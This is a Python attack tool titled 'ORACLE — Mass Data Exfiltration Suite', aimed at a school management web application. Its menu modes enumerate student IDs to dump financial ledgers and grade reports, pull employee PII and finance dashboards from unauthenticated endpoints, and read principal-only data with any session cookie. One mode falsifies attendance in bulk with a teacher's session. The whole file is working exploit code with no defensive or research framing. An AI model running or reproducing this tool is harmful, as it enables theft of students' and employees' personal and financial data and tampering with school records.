import sys
import json
import asyncio
import aiohttp
import requests
from tqdm import tqdm

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CYAN    = "\033[96m"
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
MAGENTA = "\033[95m"
DIM     = "\033[90m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

BANNER = rf"""
{CYAN}   ╔═══════════════════════════════════════════════╗
   ║  {BOLD}ORACLE{RESET}{CYAN}  — Mass Data Exfiltration Suite       ║
   ║  ST-03/04 | DR-02/03 | R-02 | PR-01 | T-08  ║
   ╚═══════════════════════════════════════════════╝{RESET}
"""

def menu():
    return f"""
  {CYAN}[1]{RESET} Student financial data dump (mobile API)     {DIM}(ST-03){RESET}
  {CYAN}[2]{RESET} Student grade report card dump               {DIM}(ST-04){RESET}
  {CYAN}[3]{RESET} Employee PII dump                            {DIM}(DR-02){RESET}
  {CYAN}[4]{RESET} Director finance dashboard scrape            {DIM}(DR-03){RESET}
  {CYAN}[5]{RESET} Student database enumeration                 {DIM}(R-02){RESET}
  {CYAN}[6]{RESET} Principal-only data read (any session)       {DIM}(PR-01){RESET}
  {CYAN}[7]{RESET} Cross-teacher attendance manipulation        {DIM}(T-08){RESET}
  {DIM}[0]{RESET} Exit
"""

# ── MODE 1: Student financial data ────────────────────────────────────────────
def mode_financial_dump(base_url):
    id_range = input(f"  {CYAN}[?]{RESET} Student ID range (e.g. 1-500): ").strip() or "1-200"
    syid     = input(f"  {CYAN}[?]{RESET} SY ID (or blank): ").strip() or "1"
    start, end = map(int, id_range.split("-"))
    
    results = []
    for sid in tqdm(range(start, end + 1), desc="Dumping ledgers", ncols=80):
        try:
            params = {"studid": sid}
            if syid:
                params["syid"] = syid
            r = requests.get(f"{base_url}/api/mobile/api_student_ledger_v2",
                             params=params, timeout=5)
            if r.status_code == 200:
                d = r.json()
                if d.get("success") and d.get("student_info", {}).get("fullname", "-") != "-":
                    info = d["student_info"]
                    fees = sum(x.get("amount", 0) for x in d.get("school_fees", []))
                    paid = sum(x.get("payment", 0) for x in d.get("school_fees", []))
                    bal = fees - paid
                    tqdm.write(f"  {GREEN}[+]{RESET} {info['fullname']} | {info.get('levelname','')} | Balance: ₱{bal:,.0f}")
                    results.append({"studid": sid, **info, "total_fees": fees, "total_paid": paid, "balance": bal})
        except:
            pass
    
    print(f"\n  {CYAN}[i]{RESET} Found {BOLD}{len(results)}{RESET} student financial records")
    if results:
        out = input(f"  {CYAN}[?]{RESET} Save to (filename or N): ").strip()
        if out and out.lower() != "n":
            with open(out, "w", encoding="utf-8") as f:
                json.dump(results, f, indent=2, default=str)
            print(f"  {GREEN}[+]{RESET} Saved to {out}")

# ── MODE 2: Grade report card dump ───────────────────────────────────────────
def mode_reportcard_dump(base_url):
    id_range = input(f"  {CYAN}[?]{RESET} Student ID range (e.g. 1-500): ").strip() or "1-200"
    syid     = input(f"  {CYAN}[?]{RESET} SY ID: ").strip() or "1"
    start, end = map(int, id_range.split("-"))
    
    results = []
    for sid in tqdm(range(start, end + 1), desc="Dumping grades", ncols=80):
        try:
            r = requests.get(f"{base_url}/api/mobile/api_reportcard_v2",
                             params={"studid": sid, "syid": syid}, timeout=5)
            if r.status_code == 200:
                data = r.json()
                if data:
                    tqdm.write(f"  {GREEN}[+]{RESET} studid={sid}: {len(data)} subjects")
                    results.append({"studid": sid, "subjects": data})
        except:
            pass
    
    print(f"\n  {CYAN}[i]{RESET} Found grades for {BOLD}{len(results)}{RESET} students")
    if results:
        out = input(f"  {CYAN}[?]{RESET} Save to (filename or N): ").strip()
        if out and out.lower() != "n":
            with open(out, "w", encoding="utf-8") as f:
                json.dump(results, f, indent=2, default=str)
            print(f"  {GREEN}[+]{RESET} Saved to {out}")

# ── MODE 3: Employee PII dump ─────────────────────────────────────────────────
def mode_employee_pii(base_url):
    print(f"  {DIM}[*] Fetching all employee data (unauthenticated)...{RESET}")
    
    actions = ["getemployees", "getemployeeattendance", "getschoolyears",
               "getsemesters", "getpaymenttypes", "getterminals", "getfinancestudents"]
    
    for action in actions:
        try:
            r = requests.get(f"{base_url}/passData", params={"action": action}, timeout=15)
            if r.status_code == 200:
                data = r.json()
                print(f"  {GREEN}[+]{RESET} {action}: {BOLD}{len(data)}{RESET} records")
                with open(f"dump_{action}.json", "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2, default=str)
            else:
                print(f"  {RED}[-]{RESET} {action}: HTTP {r.status_code}")
        except Exception as e:
            print(f"  {RED}[-]{RESET} {action}: {e}")
    
    print(f"\n  {GREEN}[+]{RESET} All dumps saved as dump_*.json")

# ── MODE 4: Director finance dashboards ──────────────────────────────────────
def mode_finance_dashboards(base_url):
    print(f"  {DIM}[*] Scraping finance dashboards (unauthenticated)...{RESET}")
    
    endpoints = [
        "/director/finance/cashiertransactionsindex",
        "/director/finance/collectionsindex",
        "/director/finance/accountreceivablesindex",
        "/director/finance/expensesindex",
        "/finance/index",
        "/hr/index",
        "/academic/index",
        "/enrollmentReport",
    ]
    
    for ep in endpoints:
        try:
            r = requests.get(f"{base_url}{ep}", timeout=10)
            size = len(r.text)
            if r.status_code == 200 and size > 500:
                print(f"  {GREEN}[+]{RESET} {ep} — {size:,} bytes (accessible)")
                fname = ep.replace("/", "_").strip("_") + ".html"
                with open(fname, "w", encoding="utf-8") as f:
                    f.write(r.text)
            elif r.status_code == 200:
                print(f"  {YELLOW}[~]{RESET} {ep} — {size} bytes (may be empty/redirect)")
            else:
                print(f"  {RED}[-]{RESET} {ep} — HTTP {r.status_code}")
        except Exception as e:
            print(f"  {RED}[-]{RESET} {ep}: {e}")

# ── MODE 5: Student DB enumeration ───────────────────────────────────────────
def mode_student_enum(base_url):
    print(f"  {DIM}[*] Fetching /studentUserDebugger (unauthenticated)...{RESET}")
    
    r = requests.get(f"{base_url}/studentUserDebugger", timeout=15)
    if r.status_code != 200:
        print(f"  {RED}[-]{RESET} HTTP {r.status_code}")
        return
    
    # Parse HTML table
    import re
    rows = re.findall(r'<tr[^>]*>(.*?)</tr>', r.text, re.DOTALL)
    students = []
    for row in rows:
        cells = re.findall(r'<td[^>]*>(.*?)</td>', row, re.DOTALL)
        if len(cells) >= 3:
            students.append({
                "sid": cells[0].strip(),
                "name": cells[1].strip() if len(cells) > 1 else "",
                "has_account": "yes" if len(cells) > 3 and "yes" in cells[3].lower() else "no"
            })
    
    print(f"  {GREEN}[+]{RESET} Found {BOLD}{len(students)}{RESET} student records")
    for s in students[:20]:
        print(f"      {s['sid']} | {s['name'][:40]} | acct={s['has_account']}")
    if len(students) > 20:
        print(f"      {DIM}... and {len(students) - 20} more{RESET}")
    
    out = input(f"  {CYAN}[?]{RESET} Save to (filename or N): ").strip()
    if out and out.lower() != "n":
        with open(out, "w", encoding="utf-8") as f:
            json.dump(students, f, indent=2)
        print(f"  {GREEN}[+]{RESET} Saved to {out}")

# ── MODE 6: Principal-only data read ─────────────────────────────────────────
def mode_principal_data(base_url):
    session = input(f"  {CYAN}[?]{RESET} laravel_session (any account): ").strip()
    syid    = input(f"  {CYAN}[?]{RESET} SY ID: ").strip() or "1"
    section = input(f"  {CYAN}[?]{RESET} Section ID: ").strip() or "1"
    level   = input(f"  {CYAN}[?]{RESET} Level ID: ").strip() or "7"
    
    cookies = {"laravel_session": session}
    
    endpoints = [
        (f"/principal/section/students/enrolled?section={section}&acad=3&syid={syid}&gradelevel={level}",
         "Enrolled students"),
        (f"/principal/grades/status?syid={syid}&section={section}&levelid={level}&acadprogid=3",
         "Grade status"),
        (f"/setup/signatories/list/sf9?syid={syid}",
         "SF9 Signatories"),
        (f"/searchStudentWithHonors?gradelevel={level}&sy={syid}&quarter=1&section={section}",
         "Student honors/rankings"),
    ]
    
    for ep, label in endpoints:
        try:
            r = requests.get(f"{base_url}{ep}", cookies=cookies, timeout=10)
            if r.status_code == 200:
                try:
                    data = r.json()
                    print(f"  {GREEN}[+]{RESET} {label}: {len(data)} records")
                except:
                    print(f"  {GREEN}[+]{RESET} {label}: {len(r.text):,} bytes")
            else:
                print(f"  {RED}[-]{RESET} {label}: HTTP {r.status_code}")
        except Exception as e:
            print(f"  {RED}[-]{RESET} {label}: {e}")

# ── MODE 7: Attendance manipulation ──────────────────────────────────────────
def mode_attendance(base_url):
    session  = input(f"  {CYAN}[?]{RESET} Teacher laravel_session: ").strip()
    stud_ids = input(f"  {CYAN}[?]{RESET} Student IDs (range e.g. 100-120): ").strip() or "100-110"
    date     = input(f"  {CYAN}[?]{RESET} Date (YYYY-MM-DD): ").strip() or "2026-06-11"
    status   = input(f"  {CYAN}[?]{RESET} Status (absent/present/late): ").strip() or "absent"
    
    start, end = map(int, stud_ids.split("-"))
    cookies = {"laravel_session": session}
    
    count = 0
    for sid in tqdm(range(start, end + 1), desc="Marking", ncols=80):
        r = requests.get(f"{base_url}/classattendance/submit",
                         params={"datavalues[0][studid]": sid,
                                 "datavalues[0][tdate]": date,
                                 "datavalues[0][newstatus]": status},
                         cookies=cookies, timeout=5)
        if r.status_code == 200:
            count += 1
    
    print(f"  {GREEN}[+]{RESET} Marked {count} students as '{status}' on {date}")

# ── MAIN ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(BANNER)
    BASE_URL = input(f"  {CYAN}[?]{RESET} Target URL: ").strip().rstrip("/")
    
    while True:
        print(menu())
        choice = input(f"  {DIM}┌─[oracle]─[~]{RESET}\n  {DIM}└──╼ ${RESET} ").strip()
        
        if choice == "0": break
        elif choice == "1": mode_financial_dump(BASE_URL)
        elif choice == "2": mode_reportcard_dump(BASE_URL)
        elif choice == "3": mode_employee_pii(BASE_URL)
        elif choice == "4": mode_finance_dashboards(BASE_URL)
        elif choice == "5": mode_student_enum(BASE_URL)
        elif choice == "6": mode_principal_data(BASE_URL)
        elif choice == "7": mode_attendance(BASE_URL)
        else: print(f"  {RED}[!]{RESET} Invalid choice")
    
    print(f"\n  {DIM}[*] ORACLE session ended{RESET}\n")
